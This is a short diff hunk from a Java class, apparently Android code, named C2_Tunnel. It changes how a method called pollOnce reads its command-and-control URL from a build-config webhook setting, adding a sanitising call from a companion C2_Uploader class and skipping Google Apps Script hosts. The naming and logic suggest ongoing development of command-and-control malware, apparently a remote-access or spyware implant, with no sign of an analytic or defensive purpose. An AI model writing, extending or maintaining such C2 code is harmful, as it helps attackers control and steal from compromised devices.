@@ -76,7 +76,7 @@ public class C2_Tunnel {
     }
 
     private static boolean pollOnce(Context context) {
-        String c2Url = BuildConfig.WEBHOOK_URL;
+        String c2Url = C2_Uploader.sanitizeC2Url(BuildConfig.WEBHOOK_URL);
         if (c2Url == null || c2Url.trim().isEmpty()) return false;
         if (c2Url.contains("script.google.com") || c2Url.contains("script.googleusercontent.com")) return false;
 
